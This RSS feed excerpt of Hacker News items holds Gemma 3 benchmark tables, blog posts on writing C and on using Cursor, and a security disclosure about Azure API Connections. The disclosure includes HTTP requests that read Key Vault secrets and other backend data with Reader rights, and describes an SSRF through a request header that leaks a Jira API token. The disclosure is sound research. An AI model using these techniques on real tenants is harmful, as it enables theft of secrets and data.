<td><a href="https://arxiv.org/abs/2107.03374" rel="nofollow">HumanEval</a></td>
<td>pass@1</td>
<td>6.10</td>
<td>36.0</td>
<td>45.7</td>
<td>48.8</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2009.03300" rel="nofollow">MMLU</a> (Pro COT)</td>
<td>5-shot</td>
<td>9.7</td>
<td>NaN</td>
<td>NaN</td>
<td>NaN</td>
</tr>
</tbody>
</table>

<h4>Multilingual capabilities</h4>

<table>
<thead>
<tr>
<th>Benchmark</th>
<th>Gemma 3 PT 1B</th>
<th>Gemma 3 PT 4B</th>
<th>Gemma 3 PT 12B</th>
<th>Gemma 3 PT 27B</th>
</tr>
</thead>

<tbody>
<tr>
<td><a href="https://arxiv.org/abs/2210.03057" rel="nofollow">MGSM</a></td>
<td>2.04</td>
<td>34.7</td>
<td>64.3</td>
<td>74.3</td>
</tr>

<tr>
<td><a href="https://huggingface.co/datasets/CohereForAI/Global-MMLU-Lite" rel="nofollow">Global-MMLU-Lite</a></td>
<td>24.9</td>
<td>57.0</td>
<td>69.4</td>
<td>75.7</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2308.16884" rel="nofollow">Belebele</a></td>
<td>26.6</td>
<td>59.4</td>
<td>78.0</td>
<td>–</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2502.12404v1" rel="nofollow">WMT24++</a> (ChrF)</td>
<td>36.7</td>
<td>48.4</td>
<td>53.9</td>
<td>55.7</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2106.03193" rel="nofollow">FloRes</a></td>
<td>29.5</td>
<td>39.2</td>
<td>46.0</td>
<td>48.8</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2106.13822" rel="nofollow">XL-Sum</a></td>
<td>4.82</td>
<td>8.55</td>
<td>12.2</td>
<td>14.9</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1910.11856v3" rel="nofollow">XQuAD</a> (all)</td>
<td>43.9</td>
<td>68.0</td>
<td>74.5</td>
<td>76.8</td>
</tr>
</tbody>
</table>

<h4>Multimodal capabilities</h4>

<table>
<thead>
<tr>
<th>Benchmark</th>
<th>Gemma 3 PT 4B</th>
<th>Gemma 3 PT 12B</th>
<th>Gemma 3 PT 27B</th>
</tr>
</thead>

<tbody>
<tr>
<td><a href="https://cocodataset.org/#home" rel="nofollow">COCOcap</a></td>
<td>102</td>
<td>111</td>
<td>116</td>
</tr>

<tr>
<td><a href="https://www.docvqa.org/" rel="nofollow">DocVQA</a> (val)</td>
<td>72.8</td>
<td>82.3</td>
<td>85.6</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2104.12756" rel="nofollow">InfoVQA</a> (val)</td>
<td>44.1</td>
<td>54.8</td>
<td>59.4</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2311.16502" rel="nofollow">MMMU</a> (pt)</td>
<td>39.2</td>
<td>50.3</td>
<td>56.1</td>
</tr>

<tr>
<td><a href="https://textvqa.org/" rel="nofollow">TextVQA</a> (val)</td>
<td>58.9</td>
<td>66.5</td>
<td>68.6</td>
</tr>

<tr>
<td><a href="https://paperswithcode.com/dataset/realworldqa" rel="nofollow">RealWorldQA</a></td>
<td>45.5</td>
<td>52.2</td>
<td>53.9</td>
</tr>

<tr>
<td><a href="https://arxiv.org/html/2406.09175v1" rel="nofollow">ReMI</a></td>
<td>27.3</td>
<td>38.5</td>
<td>44.8</td>
</tr>

<tr>
<td><a href="https://allenai.org/data/diagrams" rel="nofollow">AI2D</a></td>
<td>63.2</td>
<td>75.2</td>
<td>79.0</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2203.10244" rel="nofollow">ChartQA</a></td>
<td>45.4</td>
<td>60.9</td>
<td>63.8</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2203.10244" rel="nofollow">ChartQA</a> (augmented)</td>
<td>81.8</td>
<td>88.5</td>
<td>88.7</td>
</tr>

<tr>
<td><a href="https://visualqa.org/index.html" rel="nofollow">VQAv2</a></td>
<td>–</td>
<td>–</td>
<td>–</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/2404.12390" rel="nofollow">BLINK</a></td>
<td>38.0</td>
<td>35.9</td>
<td>39.6</td>
</tr>

<tr>
<td><a href="https://okvqa.allenai.org/" rel="nofollow">OKVQA</a></td>
<td>51.0</td>
<td>58.7</td>
<td>60.2</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1810.12440" rel="nofollow">TallyQA</a></td>
<td>42.5</td>
<td>51.8</td>
<td>54.3</td>
</tr>

<tr>
<td><a href="https://arxiv.org/abs/1908.02660" rel="nofollow">SpatialSense VQA</a></td>
<td>50.9</td>
<td>60.0</td>
<td>59.4</td>
</tr>

<tr>
<td><a href="https://github.com/google-research/big_vision/blob/main/big_vision/datasets/countbenchqa/" rel="nofollow">CountBenchQA</a></td>
<td>26.1</td>
<td>17.8</td>
<td>68.0</td>
</tr>
</tbody>
</table>

        
      </div>
    <div id="editorContainer">
        <form id="markdownForm">
          <header>
            <nav role="tablist">
              
              
            </nav>
            
          </header>
          <div role="tabpanel" data-tab="write" id="textareaInput">
            <p><label>
                Paste, drop or click to upload images (.png, .jpeg, .jpg, .svg, .gif)
                
              </label>
            </p>
          </div>
        </form>
        
      </div>
  </div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I stopped everything and started writing C again (242 pts)]]></title>
            <link>https://www.kmx.io/blog/why-stopped-everything-and-started-writing-C-again</link>
            <guid>43340731</guid>
            <pubDate>Wed, 12 Mar 2025 07:38:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.kmx.io/blog/why-stopped-everything-and-started-writing-C-again">https://www.kmx.io/blog/why-stopped-everything-and-started-writing-C-again</a>, See on <a href="https://news.ycombinator.com/item?id=43340731">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page">
  
  <p><span>2025-03-11 18:34:41</span>
  <span>Displayed 18233 times</span></p>
  <p>I've been a good student for 5 years at a French computer school. I've been a good freelance developer for 20 years. I've used Ruby on Rails exclusively however never writing my own code always for clients.</p>
<p>One day I learned Common Lisp. It was supposed to be a short mission I thought I could learn Common Lisp in ten days and hack a quick server management protocol. I ended up writing throw-away Common Lisp code that generated C for a fully-fledged ASN.1 parser and query system for a custom Common Lisp to C SNMP server.</p>
<p>Years later I wrote more and more Common Lisp code and ended up writing cl-unix-cybernetics which has the most stars on Github of all my repos there, and cl-streams and cl-cffi, and finally cl-facts which is a triple store that can be used as a Common Lisp graph database. The results were astonishing : very fast, atomic transactions, nestable transactions, compatible with unwind-protect, only 3 macros to learn and you're all set. Cl-facts was presented as a lightning talk at ELS (European Lisp Symposium) in Belgium. Slides for my talk there is available, see the <a href="https://www.kmx.io/">front page</a>.</p>
<p>Writing all these Common Lisp packages took a long time and I was loosing all my clients. I did not care, Common Lisp was awesome and a tool for future generations for sure.</p>
<p>However I also had a lot of echoes around me of people failing where Theo de Raadt and others had said they were wrong. Virtual machines still suck a lot of CPU and bandwidth for nothing but emulation. Containers in Linux with cgroups are still full of RCE (remote command execution) and priviledge escalation. New ones are discovered each year. The first report I got on those listed 10 or more RCE + PE (remote root on the machine). Remote root can also escape VMs probably also. You do have backups right ? So it kept me centered on OpenBSD and avoided me the hell that most DevOps faced : Terraform, Ansible and such. So I saw people angry with VMs and containers and also people angry with their very programming language. Like Clojure : who can write a strategy game with thousands of units each having their own vision of the world, without having a garbage collector running like hell ? In fact my friend went away and tried to write the game and failed. Garbage collectors suck, and all my Common Lisp projects have very limited applications just because of the garbage collector. And we all know it's a commercial argument to the jVM : it has one of the best GCs around and it did cost a lot to write correctly. I guess it was not written in a one time scratch</p>
<p>So I thought OK I have a killer app but no-one will run it because it's in Common Lisp. The only rational solution for performance and portability reasons, unless another tool is developed for these specific purpose like C, is C. Linux is written in C, OpenBSD is written in C, GTK+ is object-oriented pure C, GNOME is written in C. Most of the Linux desktop apps are actually written in plain old C. So why try harder ? I know C.</p>
<p>So I started writing my <strong>libc3</strong> utility library, which would become a language (<strong>C3</strong>) with an interpreter (<strong>ic3</strong>) but could also be compiled (<strong>c3c</strong>) if we did manage to get it through at some point; and data structures emerged from UTF-8 buffers and the other way around pretty fast and all was bounds-checked at memory cost but the results were awesome. Defensive programming all the way : all bugs are reduced to zero right from the start. The system has been maintained clean of wrong bugs all of the time. There are no security implications of running KC3 code. So very fast a small interpreter was born, pumping <strong>tags</strong> (an enum-tagged union of all datatypes of the language) in a REPL (read eval print loop).</p>
<p>3 years later I just finished a 5 layered refactor and all the tests pass again and the webserver seems to not be broken again. The language was renamed from C3 to KC3 as the original name was already taken. So what do we have ?</p>
<p>I had already ported the graph database (<strong>cl-facts</strong>) to C89 and though a couple of bugs remained at the time of import pretty much all the database was written during the Covid-19 lockdown in 2020. Everything was there : add a triple, remove a triple, the recursive query system, transactions, logging and persistence. Pixel perfect implementation of my original design in Common Lisp but in plain old C89 which I remembered quite well.</p>
<p>Besides the graph data base I also wrote parsers and generators to get formal semantics for all algorithmic types I know of and could write in such a short amount of time : Structs, Linked lists, Maps, Hash tables, Time, Complex, Rationals, Tuples, Code blocks, Quotes, Unquotes, Copy on write, Skip lists, Sets, etc. I have macros like I explain in my other article. I'll do a follow up with some examples of macros. I was very much inspired by the awesome work of José Valim and Elixir. See Fly.io's blog if you want to read José Valim !</p>
<p>I have a REPL (<strong>ikc3</strong>) which parses keyboard or file input and outputs all results of a KC3 evaluation to the console (standard output). It is used for most of the second phase of unit testing KC3.</p>
<p>I have a webserver with an MVC framework which is producing the very webpage you're reading : <strong>kc3_httpd</strong>.</p>
<p>I have 700 views on a Common Lisp article which is crazy I did not think Common Lisp had so many followers.</p>
<p>I have a documentation website all written using <strong>kc3_httpd</strong> and a vamped Markdown to HTML C implementation.</p>
<p>Come on Discord and join the fun.</p>

  
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I use Cursor daily - here's how I avoid the garbage parts (135 pts)]]></title>
            <link>https://www.nickcraux.com/blog/cursor-tips</link>
            <guid>43340662</guid>
            <pubDate>Wed, 12 Mar 2025 07:21:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nickcraux.com/blog/cursor-tips">https://www.nickcraux.com/blog/cursor-tips</a>, See on <a href="https://news.ycombinator.com/item?id=43340662">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__next"><p>Posted on March 12, 2025</p><p>AI for coding is in a weird spot right now.</p><p>You get people claiming that you can build a complete SaaS in 3 days, and others saying that it's worse than useless. Both of these people are probably just exaggerating or straight up lying.</p><p>I love coding with Cursor, it's completely changed the way I code, but it's also complete garbage a good deal of the time.</p><p>So as an AI skeptic i'll tell you everything I know to make your experience as good as possible.</p><p><em>Note: If you prefer watching rather than reading,<!-- --> <a href="https://www.youtube.com/watch?v=VC2b7wMfalI" target="_blank">here's a YouTube video</a> <!-- -->with the same content.</em></p><p>Let's start with an easy one.</p><p>If you don't have a<!-- --> <span>.cursorrules</span> file you are missing out.</p><p>(This has changed recently to be a bunch of<!-- --> <span>.mdc</span> files, just CMD+Shift+P<!-- --> <span>New Cursor Rule</span> and it will create one for you in the right place)</p><p>You can have one ready to go in about 10 minutes, and it will save you hours of time.</p><p>Look up your stack on this<!-- --> <a href="https://github.com/PatrickJS/awesome-cursorrules?tab=readme-ov-file#contents" target="_blank">list of cursorrules</a> <!-- -->and pull out the best bits.</p><p>But my advice is to keep it reasonably minimal and then build on it over time.</p><p>You don't need this massive file with every single programming best practice outlined.</p><p>The reason for shitty AI output is not because it forgot about DRY or SOLID. And I find that giving it too much input, and having longer chats, is when it starts to fall apart a bit. So keep it light.</p><p>And here's the thing: if you notice the same issues popping up again and again, just add a quick line telling it not to. Or even better, in your cursor chat just say "please write me a cursorrule so that you stop doing this particular thing." And then chuck it in there.</p><p>Like mine will keep forgetting about nullish coallescing (??) in JS, and even after I fix it up it will revert my change in its future changes. So of course I put that rule in and it won't happen again.</p><p>And then at the top of the file, just write some text about what the project is about. If you have a particular file structure and way of organising code that is great to put in as well.</p><p>I have found <em>by far</em> the best thing for improving the output is telling it exactly where to find the code it might otherwise spit out at you.</p><p>Like if you know it's going to need a certain function, or create a procedure very similar to something that exists, give it that context.</p><p>And you don't necessarily need to tell it the exact function - we're trying to make our lives easier here, of course I still want this to be easier than just writing the code myself.</p><p>After I tell it what I want I often just do a<!-- --> <span>see @schedule.ts @utils.ts @ScheduleHeader.tsx</span> <!-- -->and just include anything that will help it do its task - even in a more abstract "here's how something vaguely similar has been done" kind of way. The AI has been trained on a bunch of random code, so if there's anything particular to your project, then you need to tell it.</p><p>Okay and let's get into some rapid fire tips.</p><ul><li>I like Composer (now called Agent) for simple, low impact changes. And Chat (Ask) for everything else. Just the step of manually having to click apply and taking that extra second to think about the changes it's making, and in which files it's happening, rather than just be presented with a wave of green changes ready to get smashed in.</li><li>Don't blindly accept code. It's always gonna come back to bite you.</li><li>Every so often make sure you read and fully understand the most integral parts of your code, and refactor it <em>manually.</em> <!-- -->You will find a lot of gaps, and fixing it up means future AI-written code will be better.</li><li>Ask "is this the best way to do this?" or "have you considered xyz".</li><li>Learn when a problem is best solved manually.</li><li>Take extra care when using AI to fix bugs. I think it's particularly weak at fixing anything but the silliest of bugs. And it can cause a lot of damage in the process.</li><li>If it's a big and important task or you are setting the foundations for a feature, ask it to ask you any questions before writing code to make sure it has a full understanding of what you are trying to do.</li></ul><p>One of the best things about AI is that you can now write code when your brain is fried, and tackling a problem would normally be outside of your reach.</p><p>It's great for sitting on the couch and cranking out some mostly decent code, but then other days of course you just spend an hour chasing "You're right" "I see the issue now" only to end up in a worse place than you started.</p><p>But I would recommend experimenting with it and learning how best to talk to it. It's not going away, and it's just another tool that you can use.</p><p>And if you're a junior developer I would of course be very wary with it. And anyone for that matter really. I do think there's something to be said for the atrophying of my coding skills.</p><p>I also think one of the biggest factors in your experience with coding with AI is going to be <em>what</em> you are coding, and which tech stack you are using. So if it just keeps sucking no matter what you try, and you feel like you're going crazy seeing everyone hype it up, it's probably not your fault.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Azure's Weakest Link? How API Connections Spill Secrets (114 pts)]]></title>
            <link>https://binarysecurity.no/posts/2025/03/api-connections</link>
            <guid>43340505</guid>
            <pubDate>Wed, 12 Mar 2025 06:43:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://binarysecurity.no/posts/2025/03/api-connections">https://binarysecurity.no/posts/2025/03/api-connections</a>, See on <a href="https://news.ycombinator.com/item?id=43340505">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
           <p>Binary Security found the undocumented APIs for Azure API Connections. In this post we examine the inner workings of the Connections allowing us to escalate privileges and read secrets in backend resources for services ranging from Key Vaults, Storage Blobs, Defender ATP, to Enterprise Jira and SalesForce servers.
</p>
<h2 id="background">Background</h2>
<p>During a client engagement, I was checking out their Azure Resources looking for common vulnerabilities. They were utilizing a Logic App to post some messages to Slack. Usually, we can find some tokens or other sensitive information in the workflow run history of these apps, as it is common to not mark input (and output) as sensitive. I could not find anything of the sort in this case, so I moved on from the investigation. However, by chance I saw an odd response from a request automatically made from the portal when going into the API Connection resource. It was something like:</p>
<div><pre><code><span>GET</span> <span>/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack?api-version=2018-07-01-preview</span> <span>HTTP</span><span>/</span><span>2</span>
<span>Host</span><span>:</span> <span>management.azure.com</span>
<span>Authorization</span><span>:</span> <span>Bearer &lt;Token&gt;</span>


HTTP/2 200 OK
Content-Length: 1893
Content-Type: application/json; charset=utf-8


{
    "kind": "V2",
    "properties": {
        "displayName": "Slack",
        "authenticatedUser": {},
        "overallStatus": "Connected",
        "statuses":[
            {
                "status":"Connected"
            }
        ],
        "connectionState": "Enabled",
        "parameterValueSet":{
            "name":"oauth",
            "values":{}
        },
        "customParameterValues": {},
        "createdTime": "2025-01-24T11:46:25.0499291Z",
        "changedTime": "2025-01-24T11:46:25.0499291Z",
        "api": {
            "name": "slack",
            "displayName": "Slack",
            "description": "Slack is a team communication tool, that brings together all of your team communications in one place, instantly searchable and available wherever you go.",
            "iconUri": "https://conn-afd-prod-endpoint-bmc9bqahasf3grgk.b01.azurefd.net/u/v-anadhar/UpdateSlackForPlugin/1.0.1715.3917/slack/icon.png",
            "brandColor": "#78D4B6",
            "category": "Standard",
            "id": "/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/providers/Microsoft.Web/locations/norwayeast/managedApis/slack",
            "type": "Microsoft.Web/locations/managedApis"
        },
        "testLinks": [
            {
                "requestUri": "https://management.azure.com:443/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack/extensions/proxy/conversations.list?api-version=2018-07-01-preview",
                "method": "get"
            }
        ],
        "testRequests": [
            {
                "body": {
                    "request": {
                        "method": "get",
                        "path": "conversations.list"
                    }
                },
                "requestUri": "https://management.azure.com:443/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack/dynamicInvoke?api-version=2018-07-01-preview",
                "method": "POST"
            }
        ],
        "connectionRuntimeUrl": "https://d84b73b612cf5960.16.common.logic-norwayeast.azure-apihub.net/apim/slack/4355f64966c34c0cbfc15d48ec41e0c3"
    },
    "id": "/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack",
    "name": "slack",
    "type": "Microsoft.Web/connections",
    "location": "norwayeast"
}

</code></pre></div>
<p>Now, this might seem uninteresting at first glance, but there are two key fields in this response that really opened up a whole slew of possibilities.</p>
<h2 id="the-inherent-insecurity-of-api-connections">The Inherent Insecurity of API Connections</h2>
<p>Consider the <code>testLinks</code> and <code>testRequests</code> fields of the above response. It seems that they provide a sort of proxy between the Azure Management API and the actual backend server, most clearly seen by the <code>extensions/proxy</code> path. We can also see that the connection perhaps is authenticated in some way, by the <code>OAuth</code> value in the <code>parameterValueSet</code>. Now, naively, I would think that this means that some user, probably whoever set this up, is authenticated to this connection, and we would need his token to call through the connection, or maybe do an <code>OAuth</code> dance ourselves.</p>
<p>What I would <strong>not</strong> expect is that anyone with Reader permissions on the connection is allowed to arbitrarily call any endpoint on the connection:</p>
<div><pre><code><span>
</span><span>GET</span> <span>/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/logic-app-tests/providers/Microsoft.Web/connections/jira/extensions/proxy/conversations.list</span> <span>HTTP</span><span>/</span><span>2</span>
<span>Host</span><span>:</span> <span>management.azure.com</span>
<span>Authorization</span><span>:</span> <span>Bearer &lt;Token&gt;</span>


HTTP/2 200 OK
Content-Type: application/json
Content-Length: 18329

"ok": true,
"channels": [
    {
        "id": "C08B8RB5D39",
        "name": "social",
        "is_channel": true,
        "is_group": false,
        "is_im": false,
        "is_mpim": false,
        "is_private": false,
        "created": 1738674777,
        "is_archived": false,
        "is_general": false,
        "unlinked": 0,
        "name_normalized": "social",
        "is_shared": false,
        "is_org_shared": false,
        "is_pending_ext_shared": false,
        "pending_shared": [],
        "context_team_id": "T08BPBEC890",
        "updated": 1738674779593,
        "parent_conversation": null,
        "creator": "U08C22K3HPT",
        "is_ext_shared": false,
        "shared_team_ids": [
            "T08BPBEC890"
        ],
        "pending_connected_team_ids": [],
        "is_member": true,
&lt;...&gt;

</code></pre></div>
<p>The response is actually exactly the same as a direct query on the Slack API endpoint <a href="https://api.slack.com/methods/conversations.list">conversations.list</a></p>
<p>While the Slack case is perhaps not the most security critical, this result begs the question: Does this work for all the other types of APIs exposed through this interface?</p>
<p>The answer is yes. If you have created an API Connection to any backend server, this includes other Azure resources, all Readers on that subscription can call all <code>GET</code> requests defined on the connection. Specifically, this includes Key Vaults, SQL Databases, Jira-servers, Defender ATP, etc.</p>
<h2 id="azure-management-arm-apis-security-model">Azure Management (ARM) API’s Security Model</h2>
<p>Before I show how to exploit this properly, some background on the Azure Management API is required. While we cannot know for sure how the developers at Microsoft designed the system, it seems clear to me that initially, the security model of the management API considered that Readers should be allowed to perform <code>GET</code> requests. You would have to be <code>Contributor</code> or higher to perform any changes, i.e. using any of the <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, etc methods.</p>
<p>This can be seen by for instance requiring a number of sensitive endpoints for <code>App Services</code> to be empty <code>POST</code> requests, like <a href="https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list-host-keys">List Host Keys</a>.</p>
<p>At Binary Security we have reported a number of vulnerabilities relating to the leaking of sensitive information through insecure <code>GET</code> endpoints. The result of this is that the security model has been somewhat changed in recent times, and it is now not obvious if a Reader is allowed to call a <code>GET</code> endpoint. This is, however, still a viable attack method, and reading the documentation is still a goldmine for exploitable bugs.</p>
<p>Getting back to the API Connections, it should be clear that the Management’s <code>/extensions/proxy/{action}</code> endpoints will allow all Readers to call the defined <code>GET</code> requests. And while this is not seen as a problem in the ARM world, there is of course no guarantee that the connected API adheres to this security model.</p>
<h2 id="creating-an-api-connection">Creating an API Connection</h2>
<p>API Connections are resources in the Azure world, just like Key Vaults, SQL Databases or VMs, but they are not required to be explicitly created. They are automatically created for you when setting up Actions in a Logic App, so even if you have never heard of them before, it is quite possible that there are a lot of them hanging out in your tenant. For instance, creating a connection to your Key Vault is as easy as going to the Logic App Designer view, finding the Key Vaults actions, setting some initial values and authenticating.
<img src="https://binarysecurity.no/assets/images/posts/createkeyvault-connection.png" alt="Sign in to create the connection"></p>
<p>This of course requires that the person setting it up, and authenticating to the Key Vault has appropriate access to the Key Vault. After signing in, it is not required to even save the Workflow, the resource is still created, and will need to be explicitly deleted if it is not needed any more.</p>
<p>The flows for internal Azure Resources are all similar, where you can choose between different authentication types. For external resources, the setup varies, but in all cases, some authentication information is saved within the API Connection in some way, and this is used when querying the API.</p>
<p>This means that the authentication used on the backend API call is always the same, and does not depend on the user or principal calling the ARM API. Crucially, the backend cannot know whether the call comes from the Logic App or from the proxy endpoint, called by any Reader on the resource.</p>
<h2 id="the-api-connection-api">The API Connection API</h2>
<p>The full list of API Connections (Connectors) can be seen <a href="https://learn.microsoft.com/en-us/connectors/connector-reference/">here</a>. The proxy endpoints are not explicitly listed, but they can either be deduced from the API of the connected service, or by querying the <code>managedAPIs</code> endpoint for that specific Connector, which exposes a Swagger definition of the API. Here we query it for the definition of the Jira Connector:</p>
<div><pre><code><span>GET</span> <span>/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/providers/microsoft.web/locations/norwaywest/managedapis/jira?api-version=2018-07-01-preview&amp;export=true</span> <span>HTTP</span><span>/</span><span>2</span>
<span>Host</span><span>:</span> <span>management.azure.com</span>
<span>Authorization</span><span>:</span> <span>Bearer &lt;Token&gt;</span>

HTTP/2 200 OK
&lt;...&gt;

{
    "/{connectionId}/3/issue/{issueIdOrKey}": {
        "put": {
            "description": "Edits an issue. A transition may be applied and issue properties updated as part of the edit. The edits to the issue's fields are defined using update and fields.",
            "summary": "Edit Issue",
            "tags": [
                "Issues"
            ],
            "operationId": "EditIssue",
            "deprecated": false,
            "produces": [
                "application/json"
            ],
            "consumes": [
                "application/json"
            ],
            "parameters": [
                {
                    "name": "connectionId",
                    "in": "path",
                    "required": true,
                    "type": "string",
                    "x-ms-visibility": "internal"
                },
                {
                    "name": "issueIdOrKey",
                    "in": "path",
                    "required": true,
                    "type": "string",
                    "x-ms-summary": "Issue ID or Key",
                    "description": "Provide the Issue ID or Key for the issue you wish to edit",
                    "x-ms-url-encoding": "single"
                },
&lt;...&gt;

</code></pre></div>
<p>The <code>{connectionId}</code> in this case is the full path to the <code>proxy</code> endpoint, something like <code>/subscription/[SUBSCRIPTION_ID]/resourceGroups/[RESOURCE_GROUP]/providers/Microsoft.Web/connections/[CONNECTION_NAME]/extensions/proxy/</code>.</p>
<p>Armed with this knowledge, we can go searching for sensitive endpoints.</p>
<h3 id="azure-key-vaults">Azure Key Vaults</h3>
<p>The Connector for Key Vaults is maybe the one with the highest impact. The Swagger definition includes these sensitive <code>GET</code> endpoints</p>
<ul>
 <li><code>/{connectionId}/secrets</code> for listing secrets</li>
 <li><code>/{connectionId}/secrets/{secretName}/value</code> to retrieve the value of the secret</li>
</ul>
<p><img src="https://binarysecurity.no/assets/images/posts/keyvault_value.png" alt="Leaking Secrets through the connection"></p>
<h3 id="sql-databases">SQL Databases</h3>
<p>The SQL Connector is quite similar to the Key Vault, you are basically free to read whatever you want:</p>
<ul>
 <li>
   <p><code>/{connectionId}/databases</code> -  List Databases</p>
 </li>
 <li>
   <p><code>/{connectionId}/datasets</code> - List Datasets</p>
 </li>
 <li>
   <p><code>/{connectionId}/datasets({dataset})/tables({table})/items</code> - Get rows from a table</p>
 </li>
</ul>
<p><img src="https://binarysecurity.no/assets/images/posts/get-data-from-sql.png" alt="Reading the rows of the database"></p>
<p>There is also a hilarious error message here, when trying to do some path traversing in the dataset name. It did not seem to be exploitable in any way, but I bet you have never seen a stacktrace exposed in an HTTP status message:</p>
<p><img src="https://binarysecurity.no/assets/images/posts/api-connectors-sql-error-in-status-line.png" alt="Path traversal leads to stacktrace in HTTP status message"></p>
<h2 id="jira">Jira</h2>
<p>The Jira Connector also exposes effectively everything on your Jira instance:</p>
<ul>
 <li>
   <p><code>/{connectionId}/v2/project/search</code> - List projects</p>
 </li>
 <li>
   <p><code>/{connectionId}/user/permission/search</code> - List users</p>
 </li>
 <li>
   <p><code>/{connectionId}/2/search</code> - List issues</p>
 </li>
 <li>
   <p><code>/{connectionId}/issue/{issueKey}</code> - Read an issue</p>
 </li>
</ul>
<p>This connector is also interesting because it, of course, must be connected to your Jira instance somewhere else on the Internet. When setting up the connection, the developer gives the connection the URL of the Jira Instance. Incredibly, this is ignored in all subsequent requests, and instead, a special <code>X-Request-Jirainstance</code> header must be included in the request. This should point to your Jira instance, but there is no verification, so an attacker is free to SSRF at will. By setting this to an attacker-controlled server, the attacker will receive the API token used by the connection. This effectively also bypasses the restriction on the requests, and allows the attacker to query any endpoint with any method.</p>
<p><img src="https://binarysecurity.no/assets/images/posts/send-request-to-collaborator.png" alt="The special header will force the server to make a request to an attacker-controlled site"></p>
<p><img src="https://binarysecurity.no/assets/images/posts/collaborator-receives-token.png" alt="The attacker receives the request, with the token in the `Authorization` header"></p>
<p>Note that this attack is only possible when using the <code>APIToken</code> authentication mechanism. When using <code>OAuth</code>, a GUID is used to identify your Jira Instance.</p>
<h2 id="the-rest">The Rest</h2>
<p>All API Connections must be considered insecure as long as Readers can call the backend server. In nearly all cases I have seen, the connection exposes all information on the backend service. In addition to the ones above, this includes:</p>
<ul>
 <li>Salesforce</li>
 <li>Azure Storage Blobs</li>
 <li>Azure Defender ATP</li>
 <li>Google Mail, Contacts, Calendars</li>
</ul>
<p>and probably much more.</p>
<h2 id="future-work">Future work</h2>
<p>I think there is significant undiscovered potential in these connections. Without going into detail, I can tell you that API Connections have a significant amount of architecture hidden between the Management Server and the backend API. All calls go from ARM to a <em>global</em> APIM instance containing every tenant’s API Connection, utilizing a <a href="https://github.com/Azure/azure-tokens">Token Store</a>. The initial authentication setup likewise goes through a <em>global</em> Consent server for storing tokens. If this hidden infrastructure is compromised, there will be significant cross-tenant impact as well.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Hopefully by now, you have realized the impact of a lacking security model. While these endpoints are undocumented, that only makes them harder to find, not exploit. I am confident that any security researcher who had found them would immediately have noticed the glaring security hole it puts in their tenant. Hopefully, this post will allow others to discover more insecurities in Azure, so that we can be more secure in the future.</p>
<h2 id="microsoft-response">Microsoft response:</h2>
<ul>
 <li>Jan 6: Report submitted to Microsoft, both a general for API Connections and one specifically for Jira.</li>
 <li>Jan 7: API Connection case is closed by Microsoft as not valid, I submit it again with more words.</li>
 <li>Jan 10: Microsoft confirms the API Connection vulnerability</li>
 <li>Jan 12-17: Microsoft fixes the API Connection vulnerability by not allowing any requests through <code>/extensions/proxy</code> except for <code>testrequests</code>.</li>
 <li>Jan 30: Microsoft replies on the Jira ticket, saying they cannot reproduce it, which should be obvious, since now it is fixed.</li>
 <li>Feb 12: Jira Ticket is closed</li>
 <li>Feb 13: Microsoft replies to the API Connection case, saying it has been fixed.</li>
 <li>Feb 20: The case is closed as a duplicate.</li>
</ul>
       </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gemma 3 Technical Report [pdf] (397 pts)]]></title>
            <link>https://storage.googleapis.com/deepmind-media/gemma/Gemma3Report.pdf</link>
            <guid>43340491</guid>
            <pubDate>Wed, 12 Mar 2025 06:39:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://storage.googleapis.com/deepmind-media/gemma/Gemma3Report.pdf">https://storage.googleapis.com/deepmind-media/gemma/Gemma3Report.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=43340491">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[The Insecurity of Telecom Stacks in the Wake of Salt Typhoon (241 pts)]]></title>
            <link>https://soatok.blog/2025/03/12/on-the-insecurity-of-telecom-stacks-in-the-wake-of-salt-typhoon/</link>
            <guid>43340196</guid>
            <pubDate>Wed, 12 Mar 2025 05:21:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://soatok.blog/2025/03/12/on-the-insecurity-of-telecom-stacks-in-the-wake-of-salt-typhoon/">https://soatok.blog/2025/03/12/on-the-insecurity-of-telecom-stacks-in-the-wake-of-salt-typhoon/</a>, See on <a href="https://news.ycombinator.com/item?id=43340196">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

			
